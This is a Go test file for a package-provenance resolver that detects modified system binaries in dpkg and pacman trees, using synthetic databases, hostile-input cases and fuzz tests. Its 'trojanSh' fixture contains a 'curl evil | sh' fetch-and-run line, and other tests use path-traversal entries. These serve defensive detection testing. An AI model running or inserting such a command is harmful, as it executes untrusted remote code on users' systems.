package provenance

import (
	"bytes"
	"compress/gzip"
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"testing"
)

// ── fixtures (synthetic, generated here) ─────────────────────────────────────

func writeFile(t *testing.T, path string, data []byte) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		t.Fatal(err)
	}
}

func md5hex(b []byte) string    { s := md5.Sum(b); return hex.EncodeToString(s[:]) }
func sha256hex(b []byte) string { s := sha256.Sum256(b); return hex.EncodeToString(s[:]) }

func digestsOf(b []byte) Digests { return Digests{MD5: md5hex(b), SHA256: sha256hex(b)} }

var (
	lsBytes    = []byte("\x7fELF\x02\x01\x01\x00shipped ls")
	catBytes   = []byte("#!/bin/sh\necho shipped cat\n")
	dataBytes  = []byte("plain data file shipped by a package\n")
	confBytes  = []byte("# shipped conffile\n")
	trojanELF  = []byte("\x7fELF\x02\x01\x01\x00trojaned ls")
	trojanSh   = []byte("#!/bin/sh\ncurl evil | sh\n")
	editedConf = []byte("# edited by the admin\n")
)

// dpkgRoot builds a merged-/usr dpkg tree:
//
//	coreutils 9.4-3    /usr/bin/ls (md5), /usr/bin/cat (md5), /usr/share/doc/coreutils/data (md5)
//	adduser 3.137      conffile /etc/adduser.conf (status Conffiles)
//	nomd5 1.0          /usr/bin/nomd5 listed, no .md5sums (unverifiable)
//	libfoo:amd64 2.0   /lib/x86_64-linux-gnu/libfoo.so.1 spelled old-style in .list, md5sums under usr/lib
//	diverter 1.0       diverts /usr/bin/divert (shipped by coreutils) to /usr/bin/divert.distrib
func dpkgRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	dpkg := filepath.Join(root, "var", "lib", "dpkg")
	for _, d := range []string{"bin", "sbin", "lib", "lib64"} {
		if err := os.MkdirAll(filepath.Join(root, "usr", d), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink("usr/"+d, filepath.Join(root, d)); err != nil {
			t.Fatal(err)
		}
	}
	writeFile(t, filepath.Join(dpkg, "status"), []byte(strings.Join([]string{
		"Package: coreutils",
		"Status: install ok installed",
		"Architecture: amd64",
		"Version: 9.4-3",
		"Description: GNU core utilities",
		"",
		"Package: adduser",
		"Status: install ok installed",
		"Version: 3.137",
		"Conffiles:",
		" /etc/adduser.conf " + md5hex(confBytes),
		" /etc/deluser.conf 00000000000000000000000000000000 obsolete",
		"Description: add and remove users",
		"",
		"Package: libfoo",
		"Status: install ok installed",
		"Architecture: amd64",
		"Multi-Arch: same",
		"Version: 2.0",
		"",
		"Package: nomd5",
		"Status: install ok installed",
		"Version: 1.0",
		"",
		"Package: diverter",
		"Status: install ok installed",
		"Version: 1.0",
		"",
	}, "\n")))
	writeFile(t, filepath.Join(dpkg, "diversions"), []byte("/usr/bin/divert\n/usr/bin/divert.distrib\ndiverter\n"))
	info := filepath.Join(dpkg, "info")
	writeFile(t, filepath.Join(info, "coreutils.list"), []byte(strings.Join([]string{
		"/.", "/usr", "/usr/bin", "/usr/bin/ls", "/usr/bin/cat", "/usr/bin/divert",
		"/usr/share", "/usr/share/doc", "/usr/share/doc/coreutils", "/usr/share/doc/coreutils/data",
		"/usr/share/doc/coreutils/emptydir", "",
	}, "\n")))
	writeFile(t, filepath.Join(info, "coreutils.md5sums"), []byte(
		md5hex(lsBytes)+"  usr/bin/ls\n"+
			md5hex(catBytes)+"  usr/bin/cat\n"+
			md5hex([]byte("original divert"))+"  usr/bin/divert\n"+
			md5hex(dataBytes)+"  usr/share/doc/coreutils/data\n"))
	writeFile(t, filepath.Join(info, "adduser.list"), []byte("/.\n/etc\n/etc/adduser.conf\n/usr\n/usr/sbin\n/usr/sbin/adduser\n"))
	writeFile(t, filepath.Join(info, "adduser.md5sums"), []byte(md5hex(catBytes)+"  usr/sbin/adduser\n"))
	writeFile(t, filepath.Join(info, "nomd5.list"), []byte("/.\n/usr\n/usr/bin\n/usr/bin/nomd5\n"))
	writeFile(t, filepath.Join(info, "libfoo:amd64.list"), []byte("/.\n/lib\n/lib/x86_64-linux-gnu\n/lib/x86_64-linux-gnu/libfoo.so.1\n"))
	writeFile(t, filepath.Join(info, "libfoo:amd64.md5sums"), []byte(md5hex(lsBytes)+"  usr/lib/x86_64-linux-gnu/libfoo.so.1\n"))
	writeFile(t, filepath.Join(info, "diverter.list"), []byte("/.\n/usr\n/usr/bin\n/usr/bin/divert\n"))
	writeFile(t, filepath.Join(info, "diverter.md5sums"), []byte(md5hex([]byte("diverter's divert"))+"  usr/bin/divert\n"))
	// Unrelated info files that must be ignored.
	writeFile(t, filepath.Join(info, "coreutils.postinst"), []byte("#!/bin/sh\n"))

	// The files on disk.
	writeFile(t, filepath.Join(root, "usr", "bin", "ls"), lsBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "cat"), catBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "nomd5"), lsBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "divert"), []byte("diverter's divert"))
	writeFile(t, filepath.Join(root, "usr", "bin", "divert.distrib"), []byte("original divert"))
	writeFile(t, filepath.Join(root, "usr", "share", "doc", "coreutils", "data"), dataBytes)
	writeFile(t, filepath.Join(root, "etc", "adduser.conf"), editedConf)
	writeFile(t, filepath.Join(root, "usr", "lib", "x86_64-linux-gnu", "libfoo.so.1"), lsBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "stray"), []byte("nobody owns me"))
	return root
}

func TestDpkgStates(t *testing.T) {
	root := dpkgRoot(t)
	r := New(root)
	if got := r.Manager(); got != ManagerDpkg {
		t.Fatalf("manager = %q, want dpkg; notes: %v", got, r.Notes())
	}
	pkgs, paths, truncated := r.Stats()
	if truncated || pkgs < 5 || paths < 8 {
		t.Fatalf("stats = %d pkgs, %d paths, truncated=%v; notes: %v", pkgs, paths, truncated, r.Notes())
	}
	// Directories must not be indexed (the next-line prefix rule).
	if _, ok := r.lookupEntry("/usr", "bin"); ok {
		t.Error("directory /usr/bin was indexed as a file")
	}
	if _, ok := r.lookupEntry("/usr/share/doc/coreutils", "emptydir"); !ok {
		t.Error("trailing list entry (an empty directory) should be indexed as a harmless extra entry")
	}

	cases := []struct {
		name  string
		path  string
		d     Digests
		state State
		pkg   string
		ver   string
		algo  string
		find  string
	}{
		{"intact", "usr/bin/ls", digestsOf(lsBytes), OwnedIntact, "coreutils", "9.4-3", "md5", ""},
		{"intact upper-case digest", "usr/bin/ls", Digests{MD5: strings.ToUpper(md5hex(lsBytes))}, OwnedIntact, "coreutils", "9.4-3", "md5", ""},
		{"usr-merge /bin spelling", "bin/ls", digestsOf(lsBytes), OwnedIntact, "coreutils", "9.4-3", "md5", ""},
		{"modified elf", "usr/bin/ls", digestsOf(trojanELF), OwnedModified, "coreutils", "9.4-3", "md5", "elf"},
		{"modified script", "usr/bin/cat", digestsOf(trojanSh), OwnedModified, "coreutils", "9.4-3", "md5", "script"},
		{"modified data: no finding", "usr/share/doc/coreutils/data", digestsOf([]byte("changed")), OwnedModified, "coreutils", "9.4-3", "md5", ""},
		{"conffile edited", "etc/adduser.conf", digestsOf(editedConf), OwnedConffile, "adduser", "3.137", "md5", ""},
		{"conffile intact is still conffile", "etc/adduser.conf", digestsOf(confBytes), OwnedConffile, "adduser", "3.137", "md5", ""},
		{"unverifiable: no md5sums", "usr/bin/nomd5", digestsOf(lsBytes), OwnedUnverifiable, "nomd5", "1.0", "", ""},
		{"unverifiable: no scanned digest", "usr/bin/ls", Digests{SHA256: sha256hex(lsBytes)}, OwnedUnverifiable, "coreutils", "9.4-3", "md5", ""},
		{"unowned", "usr/bin/stray", digestsOf([]byte("nobody owns me")), Unowned, "", "", "", ""},
		{"multi-arch list spelled /lib, md5sums usr/lib", "usr/lib/x86_64-linux-gnu/libfoo.so.1", digestsOf(lsBytes), OwnedIntact, "libfoo:amd64", "2.0", "md5", ""},
		{"multi-arch via /lib spelling", "lib/x86_64-linux-gnu/libfoo.so.1", digestsOf(lsBytes), OwnedIntact, "libfoo:amd64", "2.0", "md5", ""},
		{"diverted path belongs to the diverter", "usr/bin/divert", digestsOf([]byte("diverter's divert")), OwnedIntact, "diverter", "1.0", "md5", ""},
		{"diverted-away file at its new path", "usr/bin/divert.distrib", digestsOf([]byte("original divert")), OwnedIntact, "coreutils", "9.4-3", "md5", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := r.Lookup(filepath.Join(root, tc.path), tc.d)
			if got.State != tc.state || got.Package != tc.pkg || got.Version != tc.ver || got.DigestAlgo != tc.algo {
				t.Fatalf("Lookup(%s) = %+v, want state=%s pkg=%s ver=%s algo=%s", tc.path, got, tc.state, tc.pkg, tc.ver, tc.algo)
			}
			if got.Manager != ManagerDpkg {
				t.Errorf("manager = %q", got.Manager)
			}
			if tc.state.Owned() && tc.algo != "" && got.ShippedDigest == "" {
				t.Error("owned path with a digest algorithm must carry the shipped digest")
			}
			switch {
			case tc.find == "" && got.Finding != nil:
				t.Errorf("unexpected finding %+v", got.Finding)
			case tc.find != "" && (got.Finding == nil || got.Finding.Kind != tc.find):
				t.Errorf("finding = %+v, want kind %s", got.Finding, tc.find)
			case tc.find != "":
				if got.Finding.Class != ClassModifiedSystemBinary || got.Finding.Technique != TechniqueModifiedSystemBinary {
					t.Errorf("finding class/technique = %s/%s", got.Finding.Class, got.Finding.Technique)
				}
				if !strings.Contains(got.Finding.Detail, "coreutils") {
					t.Errorf("detail should name the package: %q", got.Finding.Detail)
				}
			}
		})
	}
}

func TestSummaryWording(t *testing.T) {
	cases := []struct {
		p    Provenance
		want string
	}{
		{Provenance{Manager: "dpkg", Package: "coreutils", Version: "9.4-3", State: OwnedIntact}, "dpkg coreutils 9.4-3 (intact)"},
		{Provenance{Manager: "dpkg", Package: "coreutils", Version: "9.4-3", State: OwnedModified}, "dpkg coreutils 9.4-3 (MODIFIED)"},
		{Provenance{Manager: "dpkg", Package: "adduser", State: OwnedConffile}, "dpkg adduser (conffile)"},
		{Provenance{Manager: "dpkg", Package: "x", State: OwnedUnverifiable}, "dpkg x (unverifiable)"},
		{Provenance{Manager: "dpkg", State: Unowned}, "dpkg (unowned)"},
		{Provenance{Manager: "rpm", State: Unsupported}, "rpm (unsupported)"},
		{Provenance{State: Unknown}, "unknown"},
	}
	for _, tc := range cases {
		if got := tc.p.Summary(); got != tc.want {
			t.Errorf("Summary(%+v) = %q, want %q", tc.p, got, tc.want)
		}
	}
}

func TestNoDatabaseAndRPMOnly(t *testing.T) {
	empty := t.TempDir()
	r := New(empty)
	if got := r.Lookup(filepath.Join(empty, "x"), Digests{}); got.State != Unknown || got.Manager != "" {
		t.Errorf("no database: %+v", got)
	}
	if !strings.Contains(r.Summary(), "no package database") {
		t.Errorf("summary = %q", r.Summary())
	}

	rpm := t.TempDir()
	if err := os.MkdirAll(filepath.Join(rpm, "var", "lib", "rpm"), 0o755); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(rpm, "var", "lib", "rpm", "rpmdb.sqlite"), []byte("SQLite format 3\x00"))
	r = New(rpm)
	if got := r.Lookup(filepath.Join(rpm, "usr", "bin", "ls"), Digests{}); got.State != Unsupported || got.Manager != ManagerRPM {
		t.Errorf("rpm only: %+v", got)
	}
	if !strings.Contains(r.Summary(), "unsupported") {
		t.Errorf("summary = %q", r.Summary())
	}
}

func TestRelativeAndOutsideRootPaths(t *testing.T) {
	root := dpkgRoot(t)
	r := New(root)
	// A path outside the root is looked up as spelled (the running host's
	// own tree): it cannot be owned by the test database.
	if got := r.Lookup("/definitely/not/here", Digests{}); got.State != Unowned {
		t.Errorf("outside root: %+v", got)
	}
	if got := r.Lookup(root, Digests{}); got.State != Unknown {
		t.Errorf("root itself: %+v", got)
	}
	// Relative paths are made absolute against the working directory.
	wd, _ := os.Getwd()
	rel, err := filepath.Rel(wd, filepath.Join(root, "usr", "bin", "ls"))
	if err != nil {
		t.Skip("cannot form a relative path:", err)
	}
	if got := r.Lookup(rel, digestsOf(lsBytes)); got.State != OwnedIntact {
		t.Errorf("relative: %+v", got)
	}
}

// ── pacman ───────────────────────────────────────────────────────────────────

func gzipBytes(t *testing.T, b []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	if _, err := zw.Write(b); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func pacmanRoot(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "usr", "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("usr/bin", filepath.Join(root, "bin")); err != nil {
		t.Fatal(err)
	}
	local := filepath.Join(root, "var", "lib", "pacman", "local")
	pkg := filepath.Join(local, "coreutils-9.4-3")
	writeFile(t, filepath.Join(pkg, "desc"), []byte("%NAME%\ncoreutils\n\n%VERSION%\n9.4-3\n\n%DESC%\nGNU core utilities\n"))
	writeFile(t, filepath.Join(pkg, "files"), []byte("%FILES%\nusr/\nusr/bin/\nusr/bin/ls\nusr/bin/cat\nusr/bin/with space\nusr/bin/nodigest\netc/\netc/coreutils.conf\n\n%BACKUP%\netc/coreutils.conf\t"+md5hex(confBytes)+"\n\n"))
	mtree := "#mtree\n" +
		"/set type=file uid=0 gid=0 mode=755\n" +
		"./.BUILDINFO time=1 size=1 md5digest=00000000000000000000000000000000\n" +
		"./usr time=1 type=dir\n" +
		"./usr/bin time=1 type=dir\n" +
		"./usr/bin/ls time=1 size=20 md5digest=" + md5hex(lsBytes) + " sha256digest=" + sha256hex(lsBytes) + "\n" +
		"./usr/bin/cat time=1 size=20 md5digest=" + md5hex(catBytes) + "\n" +
		"./usr/bin/with\\040space time=1 size=3 sha256digest=" + sha256hex(dataBytes) + "\n" +
		"./etc/coreutils.conf time=1 size=3 sha256digest=" + sha256hex(confBytes) + "\n" +
		"./usr/bin/link type=link link=ls\n"
	writeFile(t, filepath.Join(pkg, "mtree"), gzipBytes(t, []byte(mtree)))
	// A symlinked package directory must be skipped.
	if err := os.Symlink(pkg, filepath.Join(local, "evil-1.0-1")); err != nil {
		t.Fatal(err)
	}
	writeFile(t, filepath.Join(root, "usr", "bin", "ls"), lsBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "cat"), catBytes)
	writeFile(t, filepath.Join(root, "usr", "bin", "with space"), dataBytes)
	writeFile(t, filepath.Join(root, "etc", "coreutils.conf"), editedConf)
	return root
}

func TestPacmanStates(t *testing.T) {
	root := pacmanRoot(t)
	r := New(root)
	if got := r.Manager(); got != ManagerPacman {
		t.Fatalf("manager = %q; notes %v", got, r.Notes())
	}
	for _, n := range r.Notes() {
		if !strings.Contains(n, "symbolic link") {
			t.Errorf("unexpected note: %s", n)
		}
	}
	cases := []struct {
		path  string
		d     Digests
		state State
		algo  string
		find  string
	}{
		{"usr/bin/ls", digestsOf(lsBytes), OwnedIntact, "sha256", ""},
		{"bin/ls", digestsOf(lsBytes), OwnedIntact, "sha256", ""},
		{"usr/bin/ls", digestsOf(trojanELF), OwnedModified, "sha256", "elf"},
		{"usr/bin/cat", digestsOf(catBytes), OwnedIntact, "md5", ""},
		{"usr/bin/cat", digestsOf(trojanSh), OwnedModified, "md5", "script"},
		{"usr/bin/with space", digestsOf(dataBytes), OwnedIntact, "sha256", ""},
		{"usr/bin/nodigest", digestsOf(dataBytes), OwnedUnverifiable, "", ""},
		// %BACKUP% records an md5; the mtree's sha256 for the same path wins.
		{"etc/coreutils.conf", digestsOf(editedConf), OwnedConffile, "sha256", ""},
		{"usr/bin/nothing", digestsOf(dataBytes), Unowned, "", ""},
	}
	for _, tc := range cases {
		got := r.Lookup(filepath.Join(root, tc.path), tc.d)
		if got.State != tc.state || got.DigestAlgo != tc.algo {
			t.Errorf("Lookup(%s) = %+v, want %s/%s", tc.path, got, tc.state, tc.algo)
		}
		if tc.state.Owned() && (got.Package != "coreutils" || got.Version != "9.4-3") {
			t.Errorf("Lookup(%s) package = %s %s", tc.path, got.Package, got.Version)
		}
		if (tc.find == "") != (got.Finding == nil) || (got.Finding != nil && got.Finding.Kind != tc.find) {
			t.Errorf("Lookup(%s) finding = %+v, want %q", tc.path, got.Finding, tc.find)
		}
	}
	if _, ok := r.lookupEntry("/usr/bin", "link"); ok {
		t.Error("an mtree link entry must not be indexed as a file")
	}
}

func TestUnvis(t *testing.T) {
	cases := []struct {
		in   string
		want string
		ok   bool
	}{
		{"/usr/bin/ls", "/usr/bin/ls", true},
		{`/usr/bin/with\040space`, "/usr/bin/with space", true},
		{`/a\134b`, `/a\b`, true},
		{`/bad\0`, "", false},
		{`/bad\zzz`, "", false},
		{`/bad\`, "", false},
	}
	for _, tc := range cases {
		got, ok := unvis(tc.in)
		if ok != tc.ok || got != tc.want {
			t.Errorf("unvis(%q) = %q,%v want %q,%v", tc.in, got, ok, tc.want, tc.ok)
		}
	}
}

// ── hostile databases ────────────────────────────────────────────────────────

func TestHostileDpkgDatabase(t *testing.T) {
	root := dpkgRoot(t)
	info := filepath.Join(root, "var", "lib", "dpkg", "info")
	// A huge line (over the line cap) in a .list, with a good line after it.
	writeFile(t, filepath.Join(info, "huge.list"), []byte("/.\n/usr\n/usr/bin\n/usr/bin/"+strings.Repeat("A", MaxLineBytes+10)+"\n/usr/bin/huge-ok\n"))
	// Binary junk where md5sums should be.
	junk := make([]byte, 4096)
	for i := range junk {
		junk[i] = byte(i * 7)
	}
	writeFile(t, filepath.Join(info, "junk.md5sums"), junk)
	writeFile(t, filepath.Join(info, "junk.list"), []byte("/.\n/usr\n/usr/bin\n/usr/bin/junk\n"))
	// A path that tries to escape the root.
	writeFile(t, filepath.Join(info, "escape.list"), []byte("/../../../etc/escaped\n"))
	writeFile(t, filepath.Join(info, "escape.md5sums"), []byte(md5hex(dataBytes)+"  ../../etc/escaped2\n"))
	// A symlinked .list pointing out of the database directory.
	outside := filepath.Join(t.TempDir(), "outside.list")
	writeFile(t, outside, []byte("/.\n/usr\n/usr/bin\n/usr/bin/from-outside\n"))
	if err := os.Symlink(outside, filepath.Join(info, "linked.list")); err != nil {
		t.Fatal(err)
	}
	// A malformed diversions file.
	writeFile(t, filepath.Join(root, "var", "lib", "dpkg", "diversions"), []byte("/usr/bin/divert\n/usr/bin/divert.distrib\ndiverter\nnot-absolute\nalso\nx\n/dangling\n"))

	r := New(root)
	if r.Manager() != ManagerDpkg {
		t.Fatalf("manager = %q", r.Manager())
	}
	notes := strings.Join(r.Notes(), "\n")
	for _, want := range []string{"huge.list", "junk.md5sums", "linked.list", "diversions"} {
		if !strings.Contains(notes, want) {
			t.Errorf("notes should mention %s:\n%s", want, notes)
		}
	}
	if got := r.Lookup(filepath.Join(root, "usr/bin/huge-ok"), Digests{}); got.State != OwnedUnverifiable || got.Package != "huge" {
		t.Errorf("line after the huge line: %+v", got)
	}
	if got := r.Lookup(filepath.Join(root, "usr/bin/junk"), Digests{MD5: md5hex(nil)}); got.State != OwnedUnverifiable {
		t.Errorf("junk md5sums must not attach a digest: %+v", got)
	}
	if got := r.Lookup(filepath.Join(root, "usr/bin/from-outside"), Digests{}); got.State != Unowned {
		t.Errorf("symlinked .list must be skipped: %+v", got)
	}
	// Escaping paths collapse against "/" and stay inside the root's key space.
	if got := r.Lookup(filepath.Join(root, "etc/escaped"), Digests{}); got.State != OwnedUnverifiable {
		t.Errorf("escape.list: %+v", got)
	}
	if got := r.Lookup(filepath.Join(root, "etc/escaped2"), digestsOf(dataBytes)); got.State != OwnedIntact {
		t.Errorf("escape.md5sums: %+v", got)
	}
	for dir := range r.dirIDs {
		if strings.Contains(dir, "..") {
			t.Errorf("index key escapes the root: %q", dir)
		}
	}
	for k := range r.files {
		if k.base == ".." || k.base == "." || k.base == "" {
			t.Errorf("index base escapes the root: %q", k.base)
		}
	}
	// The good package is still intact.
	if got := r.Lookup(filepath.Join(root, "usr/bin/ls"), digestsOf(lsBytes)); got.State != OwnedIntact {
		t.Errorf("ls after hostile load: %+v", got)
	}
}

func TestFIFODatabaseFileDoesNotHang(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("mkfifo")
	}
	root := dpkgRoot(t)
	status := filepath.Join(root, "var", "lib", "dpkg", "status")
	if err := os.Remove(status); err != nil {
		t.Fatal(err)
	}
	if err := syscall.Mkfifo(status, 0o644); err != nil {
		t.Skip("mkfifo:", err)
	}
	fifoList := filepath.Join(root, "var", "lib", "dpkg", "info", "fifo.list")
	if err := syscall.Mkfifo(fifoList, 0o644); err != nil {
		t.Skip("mkfifo:", err)
	}
	done := make(chan *Resolver, 1)
	go func() {
		r := New(root)
		r.Load()
		done <- r
	}()
	r := <-done // the test's own timeout is the backstop
	notes := strings.Join(r.Notes(), "\n")
	if !strings.Contains(notes, "status") || !strings.Contains(notes, "fifo.list") {
		t.Errorf("notes should record both FIFOs:\n%s", notes)
	}
	// Without status there is no version, but ownership still resolves.
	if got := r.Lookup(filepath.Join(root, "usr/bin/ls"), digestsOf(lsBytes)); got.State != OwnedIntact || got.Version != "" {
		t.Errorf("ls without status: %+v", got)
	}
}

func TestEntryCap(t *testing.T) {
	root := dpkgRoot(t)
	r := New(root)
	r.lim.paths = 3
	r.Load()
	_, paths, truncated := r.Stats()
	if !truncated || paths > 3 {
		t.Fatalf("paths=%d truncated=%v", paths, truncated)
	}
	if !strings.Contains(r.Summary(), "truncated") {
		t.Errorf("summary = %q", r.Summary())
	}
	// A truncated index never says "unowned": absence proves nothing.
	if got := r.Lookup(filepath.Join(root, "usr/bin/stray"), Digests{}); got.State != Unknown {
		t.Errorf("unlisted under a truncated index: %+v", got)
	}

	r = New(root)
	r.lim.indexBytes = 200
	r.Load()
	if _, _, truncated := r.Stats(); !truncated {
		t.Error("byte cap did not truncate")
	}

	r = New(root)
	r.lim.fileBytes = 10
	r.Load()
	if _, paths, _ := r.Stats(); paths != 0 {
		t.Errorf("every database file is over the file cap, yet %d paths were indexed", paths)
	}
	if len(r.Notes()) == 0 {
		t.Error("over-cap files must be noted")
	}
}

func TestForEachLine(t *testing.T) {
	var got []string
	skipped := forEachLine([]byte("a\r\nb\n"+strings.Repeat("x", MaxLineBytes+1)+"\nc"), func(l []byte) bool {
		got = append(got, string(l))
		return true
	})
	if skipped != 1 || strings.Join(got, ",") != "a,b,c" {
		t.Errorf("got %v skipped=%d", got, skipped)
	}
	n := 0
	forEachLine([]byte("a\nb\nc\n"), func([]byte) bool { n++; return false })
	if n != 1 {
		t.Errorf("stop: %d", n)
	}
}

// ── fuzz: never panic, never exceed the bound ────────────────────────────────

func fuzzResolver() *Resolver {
	r := New("/nonexistent-root-for-fuzz")
	r.lim.paths = 64
	r.lim.indexBytes = 8192
	r.dirIDs = map[string]uint32{}
	r.files = map[fileKey]fileEntry{}
	r.pkgIndex = map[string]uint32{}
	r.divert = map[string]diversion{}
	r.aliases = []alias{{from: "/bin", to: "/usr/bin"}}
	return r
}

func checkBounds(t *testing.T, r *Resolver) {
	t.Helper()
	if r.entries > r.lim.paths || r.bytes > r.lim.indexBytes {
		t.Fatalf("bound exceeded: entries=%d bytes=%d", r.entries, r.bytes)
	}
	if n := len(r.files); n != r.entries {
		t.Fatalf("entry count drifted: counted %d, recorded %d", n, r.entries)
	}
	if len(r.notes) > MaxNotes {
		t.Fatalf("notes over cap: %d", len(r.notes))
	}
}

func FuzzDpkgList(f *testing.F) {
	f.Add([]byte("/.\n/usr\n/usr/bin\n/usr/bin/ls\n"))
	f.Add([]byte("/../x\n\n/a/b\n/a/b/c\n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		r := fuzzResolver()
		pkg := r.pkgID("p", "1")
		r.parseDpkgList("f.list", data, pkg)
		checkBounds(t, r)
	})
}

func FuzzDpkgMD5Sums(f *testing.F) {
	f.Add([]byte("d41d8cd98f00b204e9800998ecf8427e  usr/bin/ls\n"))
	f.Add([]byte("zz\n" + strings.Repeat("0", 32) + "  \n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		r := fuzzResolver()
		pkg := r.pkgID("p", "1")
		r.parseDpkgMD5Sums("f.md5sums", data, pkg)
		checkBounds(t, r)
	})
}

func FuzzDpkgStatus(f *testing.F) {
	f.Add([]byte("Package: a\nVersion: 1\nConffiles:\n /etc/a d41d8cd98f00b204e9800998ecf8427e\n\nPackage: b\n"))
	f.Add([]byte("Conffiles:\n x\n:\n\n\n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		r := fuzzResolver()
		r.parseDpkgStatus(data, map[string]string{})
		r.parseDpkgDiversions(data)
		checkBounds(t, r)
	})
}

func FuzzMtree(f *testing.F) {
	f.Add([]byte("#mtree\n/set type=file\n./usr/bin/ls sha256digest=" + strings.Repeat("ab", 32) + "\n./usr type=dir\n"))
	f.Add([]byte("./a\\040b md5digest=" + strings.Repeat("0", 32) + "\n/unset type\n./x\\\n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		r := fuzzResolver()
		pkg := r.pkgID("p", "1")
		r.parseMtree("p", data, pkg)
		r.parsePacmanFiles("p", data, pkg)
		checkBounds(t, r)
	})
}

func TestIsCleanAbs(t *testing.T) {
	for _, p := range []string{"/", "/usr", "/usr/bin/ls", "/a/.hidden", "/a/..b", "/a/b.", "/a/b..", "/usr/lib/libc.so.6"} {
		if !isCleanAbs([]byte(p)) {
			t.Errorf("isCleanAbs(%q) = false", p)
		}
		if got := cleanAbs(p); got != p {
			t.Errorf("cleanAbs(%q) = %q: the fast path disagrees with filepath.Clean", p, got)
		}
	}
	for _, p := range []string{"", "usr", "/usr/", "//", "/a//b", "/a/./b", "/a/.", "/a/../b", "/a/..", "/.", "/.."} {
		if isCleanAbs([]byte(p)) {
			t.Errorf("isCleanAbs(%q) = true", p)
		}
	}
}
